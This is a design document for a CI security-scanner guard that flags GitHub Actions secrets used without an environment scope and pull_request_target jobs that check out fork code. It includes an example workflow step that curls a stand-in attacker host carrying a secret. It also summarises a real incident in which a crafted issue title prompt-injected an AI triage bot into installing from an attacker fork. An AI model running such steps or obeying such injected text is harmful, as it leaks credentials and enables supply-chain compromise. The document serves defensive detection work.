---
type: Guard
title: "ci-secret-env-unscoped"
description: "GitHub Actions secret used without an environment scope."
timestamp: "2026-09-02T06:41:59+00:00"
guard_id: "ci-secret-env-unscoped"
checklist_section: ["1"]
standards: ["OWASP:A02", "OWASP:A03", "OWASP:A08", "SOC2:CC8.1"]
---

# GitHub Actions secret used without an environment scope

_Author — 2026-06-21_

---

## The threat

**GitHub Actions secrets injected into an unreviewed pull-request CI run.** When a job
references `${{ secrets.* }}` but declares no `environment:` key, GitHub injects the
secret into any workflow run triggered by that job's `on:` events — including a
`pull_request` run, before any review or merge.

**Corrected 2026-08-04:** this is *not* fork-PR exfiltration. GitHub does
not pass repository secrets (other than the built-in, read-only `GITHUB_TOKEN`) to a
`pull_request` run triggered from a fork at all — that path is safe regardless of this
guard's finding, confirmed against GitHub's own documented behavior and re-verified
live against `tiangolo/fastapi`'s real workflow. The real, narrower exposure: **any
contributor who can push a branch to this repository and open a PR against it** gets
the secret injected into that PR's run, unreviewed. For a repo with outside
collaborators, or any repo where "can open a PR" is broader than "can push to main,"
this remains a real gap — an `environment:` with required-reviewer protection forces a
second human to approve before the job runs, which a same-repo PR alone does not.

A contributor with that reach can exfiltrate the secret via a workflow step:

```yaml
- run: curl -s https://attacker.example.com/?k=$MY_SECRET
  env:
    MY_SECRET: ${{ secrets.API_KEY }}
```

The fix is to declare an `environment:` on the job. GitHub's **environment protection
rules** let repository owners restrict which branches or tags can trigger jobs in that
environment and optionally require reviewer approval — closing the gap above.

- **Who reaches it:** a contributor who can push a branch to this repository and open a
  PR against it — same-repo access, not a fork.
- **Privilege required:** push access to some branch in the repository (an outside
  collaborator, not necessarily a maintainer with push access to `main`).
- **Effect:** exfiltration of secrets used in CI — deploy keys, cloud provider
  credentials, API tokens, database passwords — reachable by anyone who can open a PR,
  without review.

**Severity stays HIGH deliberately under this narrower model** (#526 review, Medium 3): the
reachable population shrank from "anyone on the internet" to "existing collaborators with
push access," but the finding is about *impact*, not likelihood — CI secrets are typically
deploy keys and cloud credentials, and an unreviewed insider path to them (no second human
in the loop before the secret flows) is still a real, serious gap even when the actor is a
trusted collaborator rather than an anonymous fork.

Standards carried by findings: **OWASP:A02** (Cryptographic Failures / secret exposure).

---

## A second, unrelated-mechanism threat (NS-11, added 2026-08-28)

This module's own docstring already named the gap this closes: `pull_request_target:` "runs in
the BASE repo's context and separately CAN expose secrets to a fork's code, but only if the
workflow also checks out the fork's head — a different, harder-to-detect pattern not caught here."

This is GitHub's own documented **"Pwn Request"** anti-pattern: a `pull_request_target`-triggered
job that then runs `actions/checkout` with a `ref:` naming the PR's own (fork-controlled) head —
`github.event.pull_request.head.sha`, `github.event.pull_request.head.ref`, `github.head_ref`, or
a literal `refs/pull/<n>/merge` — lets fork-authored code execute in the BASE repo's privileged
context. The `GITHUB_TOKEN` in that context typically has WRITE access, and any `${{ secrets.* }}`
the job references is exposed to code the fork author controls. This is **more severe** than the
unscoped-secret gap above — arbitrary code execution with repo-write privileges, not just secret
exfiltration — and does NOT require `${{ secrets.* }}` to be present at all: the write-scoped
`GITHUB_TOKEN` alone is a real target.

Real-world precedent: **GHSA-9ppg-jx86-fqw7** ("Clinejection") and the 2026 **TanStack** npm
supply-chain compromise both root-caused in this exact checkout pattern. Clinejection additionally
chained an LLM-agent (a `claude-code-action` issue-triage bot with `allowed_non_write_users: "*"`)
prompt injection to trigger it — a crafted GitHub issue title instructed the bot to run `npm
install` from an attacker-controlled fork — leading to an unauthorized `cline@2.3.0` npm publish
with a backdoored postinstall script. TanStack's compromise chained the SAME checkout pattern into
GitHub Actions cache poisoning across two separate workflows (see `actions_script_injection.md`'s
`cache-trust-boundary` rule for that second half): a PR-triggered bundle-size workflow checking
out `refs/pull/<n>/merge` poisoned a shared pnpm cache, later restored by the release pipeline,
which extracted an OIDC token from runner memory and published 84 malicious package versions.

**Severity: CRITICAL** (vs. the unscoped-secret rule's HIGH) — full repo-write code execution is a
strictly worse outcome than secret exfiltration alone.

### Detection design

`_pull_request_target_triggerable(text)` mirrors `_pull_request_triggerable` but checks the `on:`
block for `pull_request_target` instead of bare `pull_request`. `_fork_checkout_lines(text)`
tracks the CURRENT step (a step begins at a `- ` dash and ends at the next line whose indent is
at-or-shallower than that dash's — the same block-tracking style as `ai_docker.py`'s
`_check_mcp_port_exposed`): when the step is `uses: actions/checkout@…`, any `ref:` line inside
that same step matching the fork-head pattern is flagged. This runs as a SEPARATE pass in `run()`,
independent of the unscoped-secrets pass above — different trigger check, different pragma
(`# security: allow-pr-target-fork-checkout`, not the unscoped-secret rule's
`allow-unscoped-ci-secret`), no secrets-presence gate.

Rule: `ci-secret-env-unscoped/pull-request-target-fork-checkout`. Standards:
`["OWASP:A08", "OWASP:A03"]` (Software/Data Integrity Failures + Injection — not A02, since this
isn't fundamentally a secrets-exposure bug).

### When NOT to flag (fork-checkout rule)

- **Bare `pull_request:` trigger** — checking out your own PR's head under `pull_request:` is the
  normal, safe default (GitHub already withholds secrets from a fork-triggered run there); only
  `pull_request_target:` combined with a fork-head checkout is the anti-pattern.
- **`pull_request_target` with no checkout of the fork's head** — reading PR metadata via the
  `github.event.pull_request` context, or checking out the BASE ref (the default, or an explicit
  non-fork ref), is safe.
- **The fork-head `ref:` pattern on a non-checkout step** — the pattern must appear within the
  SAME step as `uses: actions/checkout@…`, not merely somewhere later in the job.
- **File-level pragma** — `# security: allow-pr-target-fork-checkout` anywhere in the file.

### Known bypasses (fork-checkout rule)

- **Indirect ref construction** — a `ref:` value built from a workflow-level `env:` variable or a
  prior step's output (not a literal `${{ github.event.pull_request… }}` expression inline) is
  not recognized; the guard matches the expression textually, not its resolved value.
- **A checkout step split across a composite/reusable action** — if the fork-head checkout
  happens INSIDE a called reusable workflow or composite action rather than inline in this
  file, it is invisible; this guard only reads workflow YAML directly in `.github/workflows/`.
- **No canary demonstration** — the shared `deploy.yml` canary base file is used by several
  guards; a `pull_request_target` trigger there would change what the unscoped-secrets rule's
  existing plant means (deliberately triggered by bare `pull_request:`). Coverage is the 8
  dedicated unit tests above.

---

## Why it's often introduced / Why this guard fits the stack

Workflow authors copy examples from documentation that show `${{ secrets.* }}` without the
`environment:` key, because for private repos or branch-protected main branches the risk is
less visible. On public repos — or any repo that accepts external PRs — the absence of
environment scoping is a straightforward secret-exfiltration path.

The `environment:` key is a job-level configuration option, not a step-level one, so it is easy
to overlook when adding secret references to existing workflow steps.

---

## Detection design

1. **`applies()` gate** — always returns `True`. Any repo that has workflows and secrets is at
   risk, regardless of the detected stack.

2. **Files scanned** — `.yml` / `.yaml` files DIRECTLY under `.github/workflows/`, not recursive
   (fixed, PR #741 review, Minor 5: GitHub never executes a workflow file in a subdirectory —
   `backup/`, `disabled/`, `templates/` — so scanning them only manufactures FPs; the earlier
   version used a recursive walk and inherited the exact FP class `actions_script_injection.py`'s
   sibling rule had already fixed). If the directory does not exist, returns `[]` immediately.

3. **Logic (per-file, per-job) — updated 2026-08-04:**

   - File-level gate: skip the whole file unless its `on:` block triggers on the bare
     `pull_request` event (`_pull_request_triggerable`).
   - Find job starts with `_JOB_START = re.compile(r"^  ([\w-]+):\s*$", re.MULTILINE)`.
     A GitHub Actions job ID appears at 2-space indent under `jobs:`.
   - Slice the file text into per-job sections (from each job-name match to the next, or EOF).
   - For each job slice, in order:
     - If `_SECRETS_REF` (`\$\{\{\s*secrets\.`) does **not** match → skip (no secrets used).
       This gate used to test the literal string `"${{ secrets."`, with the single space baked in.
       GitHub Actions allows any amount of whitespace inside the expression braces, including none,
       so `${{secrets.API_KEY}}` is the identical reference — and it failed the literal test, which
       dropped the whole job before `_SECRET_NAME` (whose `\s*` always allowed both spellings) ever
       ran (#422). Both spellings now come from one compiled pattern each, so the gate and the
       extraction cannot drift apart again.
     - If every `secrets.*` reference is the built-in `GITHUB_TOKEN` → skip (not
       exfiltratable in a useful way).
     - If every non-`GITHUB_TOKEN` reference is a known-safe, provider-scoped CI
       service token (`_SAFE_CI_SERVICE_TOKENS` — CodSpeed, Codecov, Smokeshow, Sonar)
       → skip (designed for PR-run use, cannot reach sensitive resources).
     - If the job has no shell `run:` step (`_SHELL_RUN_IN_JOB`) → skip (secrets reach
       only trusted `uses:` actions, not attacker-controlled shell code).
     - If a job-level `if:` condition restricts execution to push/release/tag/
       workflow_dispatch or excludes `pull_request` (`_JOB_IF_NON_PR`) → skip (a PR run
       can never satisfy the condition).
     - If `"\n    environment:"` (4-space indent, the job-key indent level) appears →
       skip (environment is declared).
     - Otherwise → emit a **HIGH** finding at the line number of the job name.

4. **File-level opt-out pragma** — a `# security: allow-unscoped-ci-secret` comment anywhere in the
   workflow file silences the check for the entire file (a pragma counts only as a comment, #424).

5. **Severity / rule / standards:**
   - Severity: `high`
   - Rule: `ci-secret-env-unscoped/no-environment-scope`
   - Standards: `["OWASP:A02"]`

---

## When NOT to flag

- **`environment:` declared on the job:** the 4-space-indented `environment:` key appears in the
  job's text slice.
- **No `${{ secrets.*` in the job:** the job uses no secrets; environment scoping is irrelevant.
- **File-level pragma:** `# security: allow-unscoped-ci-secret` anywhere in the workflow file.
- **No `.github/workflows/` directory:** no workflows exist; `run()` returns `[]` immediately.
- **Not `pull_request`-triggerable:** `pull_request_target`, `push`-only, `schedule`-only, etc.
  cannot reach the job via an unreviewed PR run.
- **Only `GITHUB_TOKEN` referenced:** the built-in, run-scoped token isn't a useful exfil target.
- **Only known-safe, provider-scoped CI service tokens referenced** (CodSpeed, Codecov,
  Smokeshow, Sonar) — designed for PR-run use, cannot reach sensitive resources.
- **No shell `run:` step in the job:** secrets reach only trusted `uses:` actions, not
  attacker-controlled shell code.
- **A job-level `if:` excludes PR runs** (`github.event_name == 'push'`, etc.).

The pragma is appropriate for private repos where all contributors are trusted employees, or for
workflows that only run on protected branches unreachable by an ordinary PR.

---

## Tests

| Test | What it checks |
|---|---|
| `test_ci_secret_env_unscoped_fires` | True positive: job with `${{ secrets.API_KEY }}` and no `environment:` emits HIGH. |
| `test_ci_secret_env_unscoped_silent_on_non_fork_triggers` | `schedule`-only workflow (no PR trigger) stays silent. |
| `test_ci_secret_env_unscoped_environment_silences` | Job with `environment: production` stays silent. |
| `test_ci_secret_env_unscoped_no_workflows_silent` | No `.github/workflows/` directory; `run()` returns `[]`. |
| `test_ci_secret_env_unscoped_github_token_only_silent` | Job referencing only `secrets.GITHUB_TOKEN` stays silent. |
| `test_ci_secret_env_unscoped_github_token_plus_other_fires` | `GITHUB_TOKEN` plus a real secret still fires. |
| `test_ci_secret_env_unscoped_silent_on_pull_request_target` | `pull_request_target` (base-repo context) stays silent. |
| `test_ci_secret_env_unscoped_fires_on_bare_pull_request` | Bare `pull_request:` with a real secret and no environment fires. |
| `test_ci_secret_env_unscoped_silent_on_known_safe_service_token` | `CODSPEED_TOKEN`-only job stays silent. |
| `test_ci_secret_env_unscoped_silent_actions_only_job` | Job with only `uses:` steps (no shell `run:`) stays silent. |
| `test_ci_secret_env_unscoped_fires_safe_token_plus_deploy_key` | Safe token plus a real deploy key still fires. |
| `test_ci_secret_env_unscoped_silent_push_only_job` | Job gated `if: github.event_name == 'push'` stays silent. |
| `test_ci_secret_env_unscoped_fires_without_job_if_condition` | Same multi-trigger workflow, no `if:` gate — fires. |
| `test_ci_secret_env_unscoped_message_does_not_claim_fork_exfiltration` | Pin: the finding message doesn't claim fork-PR exfiltration and names the real (same-repo PR) exposure. |

---

## Known bypasses

- **`environment:` at wrong indent:** if a developer writes `  environment:` (2-space, job-name
  indent) or `      environment:` (6-space, step indent), the guard's 4-space check misses it.
  The 4-space check is correct for GitHub's schema — job-level keys are always at 4 spaces.
- **Job IDs with non-word characters:** `_JOB_START` requires `[\w-]+` — job IDs with dots or
  other special characters are not split correctly. GitHub's specification allows only
  alphanumeric and hyphens for job IDs, so this is not a real limitation.
- **Secrets referenced in `env:` at the workflow level (not job level):** top-level `env:` keys
  that reference `${{ secrets.* }}` are not scoped to a job and therefore not detected by this
  per-job check. This is a genuine gap — workflow-level env secrets have the same exfiltration
  risk.
- **Non-YAML workflow definitions:** composite actions defined in JSON are not scanned.

---

## What this guard does NOT prove

- It does not verify that the declared `environment` has protection rules configured in the
  GitHub repository settings — an environment named `production` with no protection rules provides
  no actual gating.
- The unscoped-secrets rule does not check whether the workflow's `on:` trigger restricts fork
  PRs beyond bare `pull_request` vs everything else — the fork-checkout rule (above) covers the
  ONE specific `pull_request_target` + fork-head-checkout combination, not every way a
  `pull_request_target` workflow could mishandle fork input (e.g. one that never checks out code
  at all but still acts on fork-supplied data unsafely elsewhere).
- It does not detect secrets passed as plain-text step inputs rather than via `${{ secrets.* }}`
  interpolation.

# Citations

[1] agentsec checklist item `1-ci-secrets-scoped` (§1)
[2] OWASP:A02
[3] SOC2:CC8.1
